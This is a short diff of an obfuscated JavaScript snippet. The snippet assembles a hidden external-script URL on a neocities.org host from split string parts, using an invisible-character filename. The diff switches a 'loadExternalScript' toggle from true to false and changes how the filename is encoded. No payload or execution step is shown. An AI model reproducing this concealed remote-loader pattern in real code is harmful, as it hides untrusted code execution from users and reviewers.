@@ -1,4 +1,4 @@
-var loadExternalScript = true; // Editable toggle
+var loadExternalScript = false; // Editable toggle
 
 (function(){
     const _0x4e9f = [
@@ -19,7 +19,7 @@ var loadExternalScript = true; // Editable toggle
     const part2 = 'arebooster.';
     const part3 = 'neocities.org/';
     const part4 = 'script';
-    const part5 = '%E3%85%A4.js';
+    const part5 = 'ㅤ.js';
 
     const finalURL = part1 + part2 + part3 + part4 + part5;
 
